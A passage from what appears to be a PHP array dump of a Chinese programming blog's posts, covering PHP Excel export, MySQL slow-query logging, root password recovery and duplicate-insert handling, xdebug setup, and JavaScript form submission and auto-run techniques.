&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cells&nbsp;.=&nbsp;&quot;&lt;Cell&gt;&lt;Data&nbsp;ss:Type=\\\\&quot;String\\\\&quot;&gt;&quot;&nbsp;.&nbsp;$v&nbsp;.&nbsp;&quot;&lt;/Data&gt;&lt;/Cell&gt;\\\\n&quot;;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($k&nbsp;==&nbsp;&#39;mergedown&#39;)&nbsp;&nbsp;$this-&gt;Index&nbsp;=&nbsp;2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($k&nbsp;==&nbsp;&#39;mergedown1&#39;)&nbsp;$this-&gt;Index&nbsp;=&nbsp;3;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($k&nbsp;==&nbsp;&#39;mergedown2&#39;)&nbsp;$this-&gt;Index&nbsp;=&nbsp;4;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($k&nbsp;==&nbsp;&#39;mergedown3&#39;)&nbsp;$this-&gt;Index&nbsp;=&nbsp;5;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$flag&nbsp;=&nbsp;true;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;endforeach;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;transform&nbsp;$cells&nbsp;content&nbsp;into&nbsp;one&nbsp;row
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;lines[]&nbsp;=&nbsp;&quot;&lt;Row&gt;\\\\n&quot;&nbsp;.&nbsp;$cells&nbsp;.&nbsp;&quot;&lt;/Row&gt;\\\\n&quot;;&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;}

}

?&gt;</pre><p><strong>2.简单的输出excel文件</strong></p><pre class=\\"brush:php;toolbar:false\\">header(&quot;Content-type:&nbsp;application/vnd.ms-excel&quot;);
header(&quot;Content-Disposition:&nbsp;attachment;&nbsp;filename=test.xml&quot;);&nbsp;
header(&quot;Pragma:no-cache&quot;);
header(&#39;Expires:0&#39;);
echo&nbsp;&quot;world&quot;.&quot;\\\\t&quot;;
echo&nbsp;&quot;\\\\t\\\\n&quot;;
&nbsp;&nbsp;
/*start&nbsp;of&nbsp;second&nbsp;line*/&nbsp;&nbsp;
echo&nbsp;&quot;this&nbsp;is&nbsp;second&nbsp;line&quot;.&quot;\\\\t&quot;;&nbsp;&nbsp;
echo&nbsp;&quot;Hi,pretty&nbsp;girl&quot;.&quot;\\\\t&quot;;&nbsp;&nbsp;
echo&nbsp;&quot;\\\\t\\\\n&quot;;</pre><p><br/></p>',
            'keyword' => 'php,excel',
            'sortid' => '6',
            'img' => '',
            'views' => '2',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:48:29',
          ),
          58 => 
          array (
            'id' => '27',
            'uid' => '1',
            'title' => 'mysql开启慢查询日志',
            'content' => '<p>查看配置：</p><pre>//查看慢查询时间
show&nbsp;variables&nbsp;like&nbsp;&quot;long_query_time&quot;;默认10s</pre><pre>//查看慢查询配置情况
show&nbsp;status&nbsp;like&nbsp;&quot;%slow_queries%&quot;;</pre><pre>//查看慢查询日志路径
&nbsp;show&nbsp;variables&nbsp;like&nbsp;&quot;%slow%&quot;;</pre><p>修改配置文件</p><p style=\\"margin-left: 30px;\\" data-mce-style=\\"margin-left: 30px;\\">在my.ini中加上下面两句话<br/> &nbsp;<span style=\\"color: #008000;\\" data-mce-style=\\"color: #008000;\\">log-slow-queries = D:\\\\wamp\\\\mysql_slow_query.log<br/><span style=\\"color: #008000;\\" data-mce-style=\\"color: #008000;\\"> &nbsp;long_query_time=5<br/> &nbsp;第一句使用来定义慢查询日志的路径（因为是windows，所以不牵涉权限问题）<br/> &nbsp;第二句使用来定义查过多少秒的查询算是慢查询，我这里定义的是5秒<br/> &nbsp;第二步：查看关于慢查询的状态<br/> &nbsp;执行如下SQL语句来查看mysql慢查询的状态<br/> &nbsp;show variables like &#39;%slow%&#39;;<br/> &nbsp;执行结果会把是否开启慢查询、慢查询的秒数、慢查询日志等信息打印在屏幕上。<br/> &nbsp;第三步：执行一次慢查询操作<br/> &nbsp;其实想要执行一次有实际意义的慢查询比较困难，因为在自己测试的时候，就算查询有20万条数据的海量表，也只需要0.几秒。我们可以通过如下语句代替：<br/> &nbsp;SELECT SLEEP(10);<br/> &nbsp;第四步：查看慢查询的数量<br/> &nbsp;通过如下sql语句，来查看一共执行过几次慢查询：<br/> &nbsp;show global status like &#39;%slow%&#39;;</span></span></p><p style=\\"margin-left: 30px;\\" data-mce-style=\\"margin-left: 30px;\\">mysql日志的配置：</p><pre>注意：这些日文件在mysql重启的时候才会生成#记录所有sql语句log=E:/mysqllog/mysql.log#记录数据库启动关闭信息，以及运行过程中产生的错误信息log-error=E:/mysqllog/myerror.log#&nbsp;记录除select语句之外的所有sql语句到日志中，可以用来恢复数据文件log-bin=E:/mysqllog/bin#记录查询慢的sql语句log-slow-queries=E:/mysqllog/slow.log&nbsp;&nbsp;#慢查询时间long_query_time=0.5</pre><p>一款php写的mysql慢查询日志分析工具：<a href=\\"http://sourceforge.net/projects/myprofi/\\" data-mce-href=\\"http://sourceforge.net/projects/myprofi/\\">http://sourceforge.net/projects/myprofi/</a><br data-mce-bogus=\\"1\\"/></p><p>转载：http://www.cnblogs.com/siqi/archive/2012/11/21/2780966.html</p><p>&nbsp;</p><p><br/></p>',
            'keyword' => 'mysql,,慢查询',
            'sortid' => '4',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:41:50',
          ),
          59 => 
          array (
            'id' => '26',
            'uid' => '1',
            'title' => 'js表单提交和submit提交的区别',
            'content' => '<pre class=\\"brush:html;toolbar:false\\">&lt;!DOCTYPE&nbsp;html&nbsp;PUBLIC&nbsp;&quot;-//W3C//DTD&nbsp;XHTML&nbsp;1.0&nbsp;Strict//EN&quot;&nbsp;&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
&lt;html&nbsp;xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
&lt;head&gt;
&lt;meta&nbsp;http-equiv=&quot;Content-Type&quot;&nbsp;content=&quot;text/html;&nbsp;charset=utf-8&quot;&nbsp;/&gt;
&lt;title&gt;无标题文档&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
&lt;script&gt;

function&nbsp;test()
{
&nbsp;&nbsp;&nbsp;&nbsp;document.getElementById(&quot;myform&quot;).submit();&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;alert(11);
}
&lt;/script&gt;
&lt;form&nbsp;&nbsp;name=&quot;myfrom&quot;&nbsp;id=&quot;myform&quot;&nbsp;method=&quot;get&quot;&nbsp;action=&quot;b.php&quot;&gt;
&lt;input&nbsp;type=&quot;text&quot;&nbsp;name=&quot;pwd&quot;&nbsp;value=&quot;&quot;&nbsp;/&gt;
&lt;input&nbsp;type=&quot;submit&quot;&nbsp;name=&quot;sub&quot;&nbsp;value=&quot;111&quot;&nbsp;/&gt;
&lt;input&nbsp;type=&quot;button&quot;&nbsp;name=&quot;btn&quot;&nbsp;value=&quot;btn&quot;&nbsp;onclick=&quot;test()&quot;&nbsp;/&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</pre><p><strong style=\\"color: #993300;\\">注意：get方式提交表单时 action里面不能用url传值, post则可以这样传</strong></p><p><strong>&nbsp;</strong></p><p><strong style=\\"color: #993300;\\">js提交和submit按钮提交的区别:</strong></p><p><strong>&nbsp; &nbsp;&nbsp;</strong></p><p><strong style=\\"color: #993300;\\">&nbsp; &nbsp; 1. js提交表单时不会带上 submit 按钮的值(因为没有被单击) 所有浏览器</strong></p><p><strong style=\\"color: #993300;\\">&nbsp; &nbsp; 2. input 回车提交 w3c浏览器会带上submit按钮的值，ie6则不会带</strong></p><p><strong>&nbsp; &nbsp;&nbsp;</strong></p><p><strong style=\\"color: #993300;\\">&nbsp; &nbsp; 解决办法：增加一个hidden域,用这个来判断，无论用哪种方式提交都会有值</strong></p><p><strong>&nbsp;</strong></p><p><strong style=\\"color: #993300;\\">submit按钮上绑定提交事件:</strong></p><p><strong style=\\"color: #993300;\\">即:&lt;input type=&quot;submit&quot; name=&quot;btn&quot; value=&quot;btn&quot; onclick=&quot;test()&quot; /&gt;</strong></p><p><strong style=\\"color: #993300;\\">&nbsp; &nbsp; 都会带上submit的值, 用js提交都检测不到onsubmit状态</strong></p><p><strong style=\\"color: #993300;\\">&nbsp; &nbsp; w3c： 提交一次 </strong></p><p><strong style=\\"color: #993300;\\">&nbsp; &nbsp; ie6: 分两次提交，先js在form提交&nbsp;</strong></p><p><strong>&nbsp; &nbsp;&nbsp;</strong></p><p><strong style=\\"color: #993300;\\">&nbsp; &nbsp; 解决办法：如果按钮为submit则 检测时用onsubmit事件检测</strong></p><p><strong>&nbsp; &nbsp; </strong><strong style=\\"color: #993300;\\">如果按钮为button，则检测通过后在触发submit事件</strong></p><p><strong>&nbsp; &nbsp;</strong></p><p><strong>&nbsp; &nbsp; </strong><strong style=\\"color: #993300;\\">一定不要用js提交表单，然后又用onsubmit去检测</strong></p><p><strong>&nbsp;</strong></p><p><strong style=\\"color: #993300;\\">&nbsp; &nbsp; &nbsp;单纯的用js提交表单, alert, ff下阻塞表单的提交，而其他浏览</strong></p><p>&nbsp;</p><p><span style=\\"color: #000000;\\">转自：http://www.cnblogs.com/siqi/archive/2012/11/30/2796671.html</span></p><p><br/></p><p><br/></p>',
            'keyword' => 'js,表单,提交,submit',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:40:25',
          ),
          60 => 
          array (
            'id' => '25',
            'uid' => '1',
            'title' => 'php调试工具安装xdebug',
            'content' => '<p><span style=\\"font-size: 15px;\\"><span style=\\"font-size: 15px;\\"><strong>xdebug</strong></span></span></p><p>php.ini中加入以下配置信息即可</p><pre class=\\"brush:php;toolbar:false\\">;是否开启自动跟踪
xdebug.auto_trace&nbsp;=&nbsp;On
;是否开启异常跟踪
xdebug.show_exception_trace&nbsp;=&nbsp;On
;是否开启远程调试自动启动
xdebug.remote_autostart&nbsp;=&nbsp;On
;是否开启远程调试
xdebug.remote_enable&nbsp;=&nbsp;On
;允许调试的客户端IP
;xdebug.remote_host=192.168.1.107
;远程调试的端口（默认9000）
xdebug.remote_port=9000
;调试插件dbgp
xdebug.remote_handler=dbgp
;是否收集变量
xdebug.collect_vars&nbsp;=&nbsp;On
;是否收集返回值
xdebug.collect_return&nbsp;=&nbsp;On
;是否收集参数
xdebug.collect_params&nbsp;=&nbsp;On
;跟踪输出路径
xdebug.trace_output_dir=&quot;d:\\\\xdebug&quot;
;是否开启调试内容
xdebug.profiler_enable=On
;调试输出路径
xdebug.profiler_output_dir=&quot;d:\\\\xdebug&quot;
zend_extension_ts=E:\\\\wamp\\\\php\\\\ext\\\\php_xdebug-2.1.2-5.2-vc6.dll（需要加入相对应的扩展）</pre><p><br/></p>',
            'keyword' => 'php,调试,xdebug',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:39:38',
          ),
          61 => 
          array (
            'id' => '24',
            'uid' => '1',
            'title' => 'php 设置一个函数的最大运行时间',
            'content' => '<p>如何防止一个函数执行时间过长呢？在PHP里可以用pcntl时钟信号+异常来实现</p><pre class=\\"brush:php;toolbar:false\\">declare(ticks&nbsp;=&nbsp;1);
function&nbsp;a(){
&nbsp;&nbsp;&nbsp;&nbsp;sleep(10);
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;a&nbsp;finishi\\\\n&quot;;
}
function&nbsp;b(){
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;Stop\\\\n&quot;;
}
function&nbsp;c(){
&nbsp;&nbsp;&nbsp;&nbsp;usleep(100000);
}
function&nbsp;sig(){
&nbsp;&nbsp;&nbsp;&nbsp;throw&nbsp;new&nbsp;Exception;
}
try{
&nbsp;&nbsp;&nbsp;&nbsp;pcntl_alarm(1);
&nbsp;&nbsp;&nbsp;&nbsp;pcntl_signal(SIGALRM,&nbsp;&quot;sig&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;a();
&nbsp;&nbsp;&nbsp;&nbsp;pcntl_alarm(0);
}
catch(Exception&nbsp;$e){
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;timeout\\\\n&quot;;
}

b();
a();
b();</pre><p>原理是在函数执行前先设定一个时钟信号，如果函数的执行超过规定时间，信号会被触发，信号处理函数会抛出一个异常，被外层代码捕获。这样就跳出了原来函数的执行，接着执行下面的代码。如果函数在规定的时间内，时钟信号不会触发，在函数结束后清除时钟信号，不会有异常抛出。</p><p>转自：http://www.cnblogs.com/siqi/p/4437619.html</p><p><br/></p>',
            'keyword' => 'php,函数,最大,执行',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:38:18',
          ),
          62 => 
          array (
            'id' => '23',
            'uid' => '1',
            'title' => '自动执行JS函数的常用三种方法',
            'content' => '<p>在HTML中的Head区域中，有如下函数：</p><pre class=\\"brush:js;toolbar:false\\">&lt;SCRIPT&nbsp;&nbsp;&nbsp;LANGUAGE=&quot;JavaScript&quot;&gt;&nbsp;&nbsp;
　　functionn&nbsp;MyAutoRun()
　　{&nbsp;&nbsp;
　　　//以下是您的函数的代码，请自行修改先！
　　　alert(&quot;函数自动执行哦！&quot;);&nbsp;&nbsp;
　　}&nbsp;&nbsp;
&lt;/SCRIPT&gt;</pre><p>下面，我们就针对上面的函数，让其在网页载入的时候自动运行！</p><p>　　<strong>①第一种方法</strong></p><p>　　将如上代码改为：</p><pre class=\\"brush:js;toolbar:false\\">&lt;SCRIPT&nbsp;&nbsp;
LANGUAGE=&quot;JavaScript&quot;&gt;&nbsp;&nbsp;
　　functionn&nbsp;MyAutoRun()
　　{&nbsp;&nbsp;
　　　//以下是您的函数的代码，请自行修改先！
　　　alert(&quot;函数自动执行哦！&quot;);&nbsp;&nbsp;
　　}&nbsp;&nbsp;
　　window.onload=MyAutoRun();
//仅需要加这一句
&lt;/SCRIPT&gt;</pre><p><strong>②第二种方法</strong></p><p>　　修改网页的Body为：</p><p>　　<span style=\\"color: #546d8e;\\">&lt;body
onLoad=&quot;MyAutoRun();&quot;&gt;</span></p><p>　　或者改为：</p><p>　　<span style=\\"color: #546d8e;\\">&lt;body <span style=\\"color: #9c5a3c;\\">onLoad=&quot;javascript:MyAutoRun();&quot;</span>&gt;</span></p><p>　　<strong>③第三种方法</strong></p><p>　　使用JS定时器来间断性的执行函数：</p><p>　　setTimeout(&quot;MyAutoRun()&quot;,1000);&nbsp;&nbsp;
//隔1000毫秒就执行一次MyAutoRun()函数</p><p>　　实现方法，将最上面的那JS函数，改为：</p><pre class=\\"brush:js;toolbar:false\\">&lt;SCRIPT&nbsp;&nbsp;
LANGUAGE=&quot;JavaScript&quot;&gt;&nbsp;&nbsp;
　　functionn&nbsp;MyAutoRun()
　　{&nbsp;&nbsp;
　　　//以下是您的函数的代码，请自行修改先！
　　　alert(&quot;函数自动执行哦！&quot;);&nbsp;&nbsp;
　　}&nbsp;&nbsp;
　　setTimeout(&quot;MyAutoRun()&quot;,1000);//这样就行拉
&lt;/SCRIPT&gt;</pre><p>其它的方法比较特殊，也不常用，通用性也不大，就不介绍了！</p>',
            'keyword' => 'js,自动,执行',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:37:36',
          ),
          63 => 
          array (
            'id' => '22',
            'uid' => '1',
            'title' => 'Windows下mysql忘记root密码的解决方法',
            'content' => '<p style=\\"margin-left: 18.0pt; text-indent: -18.0pt;\\" data-mce-style=\\"margin-left: 18.0pt; text-indent: -18.0pt;\\">1、&nbsp;<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">首先检查mysql<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">服务是否启动，若已启动则先将其停止服务，可在开始菜单的运行，使用命令：</span></span></p><p>net stop mysql&nbsp;</p><p style=\\"font-family: Calibri, sans-serif;\\" data-mce-style=\\"font-family: Calibri, sans-serif;\\">&nbsp;</p><p style=\\"font-family: Calibri, sans-serif;\\" data-mce-style=\\"font-family: Calibri, sans-serif;\\"><span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">打开第一个cmd<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">窗口，切换到mysql<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">的bin<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">目录，运行命令：</span></span></span></span></p><p style=\\"font-family: Calibri, sans-serif;\\" data-mce-style=\\"font-family: Calibri, sans-serif;\\"><strong><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">mysqld --defaults-file=&quot;C:\\\\Program Files\\\\MySQL\\\\MySQL Server 5.1\\\\my.ini&quot; --console --skip-grant-tables</span></strong></p><p style=\\"font-family: Calibri, sans-serif;\\" data-mce-style=\\"font-family: Calibri, sans-serif;\\"><span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">注释：</span></p><p><span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">该命令通过跳过权限安全检查，开启mysql<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">服务，这样连接mysql<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">时，可以不用输入用户密码。&nbsp;</span></span></span></p><p>&nbsp;</p><p>&nbsp;</p><p>2<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">、打开第二个cmd<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">窗口，连接mysql<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">：</span></span></span></p><p><span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">输入命令：</span></p><p><strong><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">mysql -uroot -p</span></strong></p><p><span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">出现：</span></p><p>Enter password:</p><p><span style=\\"font-family: 宋体; color: red;\\" data-mce-style=\\"font-family: 宋体; color: red;\\">在这里直接回车，不用输入密码。</span></p><p>然后就就会出现登录成功的信息，&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;使用命令：</p><p><strong><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">show databases;</span></strong></p><p>&nbsp;</p><p>&nbsp;</p><p><span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">使用命令切换到mysql<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">数据库：</span></span></p><p><strong><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">use mysql;</span></strong></p><p><span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">使用命令更改root<span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">密码：</span></span></p><p><strong><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">UPDATE user SET Password=PASSWORD(&#39;newpassword&#39;) where USER=&#39;root&#39;;</span></strong></p><p>&nbsp;</p><p><span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">刷新权限：</span></p><p><strong><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">FLUSH PRIVILEGES;</span></strong></p><p>然后退出，重新登录：&nbsp;</p><p><strong><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">quit</span></strong></p><p>重新登录：&nbsp;</p><p><strong><span style=\\"color: red;\\" data-mce-style=\\"color: red;\\">mysql -uroot -p</span></strong></p><p><span style=\\"font-family: 宋体;\\" data-mce-style=\\"font-family: 宋体;\\">出现输入密码提示，输入新的密码即可登录：</span></p><p>Enter password: ***********</p><p>显示登录信息：&nbsp;成功 &nbsp;就一切ok了</p><p><br/></p>',
            'keyword' => 'mysql,root,密码',
            'sortid' => '4',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 15:34:38',
          ),
          64 => 
          array (
            'id' => '21',
            'uid' => '1',
            'title' => 'MySql避免重复插入记录方法(ignore,Replace,ON DUPLICATE KEY UPDATE)',
            'content' => '<p>本文章来给大家提供三种在mysql中避免重复插入记录方法，主要是讲到了ignore,Replace,ON DUPLICATE KEY UPDATE三种方法，各位同学可尝试参考。</p><p><strong>案一：使用ignore关键字</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;如果是用主键primary或者唯一索引unique区分了记录的唯一性,避免重复插入记录可以使用：</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;IGNORE&nbsp;INTO&nbsp;`table_name`&nbsp;(`email`,&nbsp;`phone`,&nbsp;`user_id`)&nbsp;VALUES&nbsp;(&#39;test9@163.com&#39;,&nbsp;&#39;99999&#39;,&nbsp;&#39;9999&#39;);</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;这样当有重复记录就会忽略,执行后返回数字0</p><p>&nbsp;&nbsp;&nbsp;&nbsp;还有个应用就是复制表,避免重复记录：</p><pre class=\\"brush:sql;toolbar:false\\">INSERT&nbsp;IGNORE&nbsp;INTO&nbsp;`table_1`&nbsp;(`name`)&nbsp;SELECT&nbsp;`name`&nbsp;FROM&nbsp;`table_2`;</pre><p><strong>方案二：使用Replace</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;语法格式：</p><pre class=\\"brush:sql;toolbar:false\\">REPLACE&nbsp;INTO&nbsp;`table_name`(`col_name`,&nbsp;...)&nbsp;VALUES&nbsp;(...);
REPLACE&nbsp;INTO&nbsp;`table_name`&nbsp;(`col_name`,&nbsp;...)&nbsp;SELECT&nbsp;...;
REPLACE&nbsp;INTO&nbsp;`table_name`&nbsp;SET&nbsp;`col_name`=&#39;value&#39;,</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;算法说明：<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;REPLACE的运行与INSERT很相像,但是如果旧记录与新记录有相同的值，则在新记录被插入之前，旧记录被删除，即：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;尝试把新行插入到表中 <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当因为对于主键或唯一关键字出现重复关键字错误而造成插入失败时： <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从表中删除含有重复关键字值的冲突行 <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;再次尝试把新行插入到表中 <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;旧记录与新记录有相同的值的判断标准就是：<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;表有一个PRIMARY KEY或UNIQUE索引，否则，使用一个REPLACE语句没有意义。该语句会与INSERT相同，因为没有索引被用于确定是否新行复制了其它的行。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;返回值：<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; REPLACE语句会返回一个数，来指示受影响的行的数目。该数是被删除和被插入的行数的和<br/>受影响的行数可以容易地确定是否REPLACE只添加了一行，或者是否REPLACE也替换了其它行：检查该数是否为1（添加）或更大（替换）。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;示例:<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# eg:(phone字段为唯一索引)</p><pre class=\\"brush:sql;toolbar:false\\">REPLACE&nbsp;INTO&nbsp;`table_name`&nbsp;(`email`,&nbsp;`phone`,&nbsp;`user_id`)&nbsp;VALUES&nbsp;(&#39;test569&#39;,&nbsp;&#39;99999&#39;,&nbsp;&#39;123&#39;);</pre><p>另外,在 SQL Server 中可以这样处理：</p><pre class=\\"brush:sql;toolbar:false\\">if&nbsp;not&nbsp;exists&nbsp;(select
&nbsp;phone&nbsp;from&nbsp;t&nbsp;where&nbsp;phone=&nbsp;&#39;1&#39;)&nbsp;&nbsp;&nbsp;insert&nbsp;into&nbsp;t(phone,&nbsp;update_time)&nbsp;
values(&#39;1&#39;,&nbsp;getdate())&nbsp;else&nbsp;&nbsp;&nbsp;&nbsp;update&nbsp;t&nbsp;set&nbsp;update_time&nbsp;=&nbsp;getdate()&nbsp;
where&nbsp;phone=&nbsp;&#39;1&#39;</pre><p>&nbsp;&nbsp;&nbsp;&nbsp;更多信息请看：http://dev.mysql.com/doc/refman/5.1/zh/sql-syntax.html#replace</p><p><strong>方案三：ON DUPLICATE KEY UPDATE</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;如‍上所写，你也可以在INSERT INTO…..后面加上 ON DUPLICATE KEY UPDATE方法来实现。如果您指定了ON 
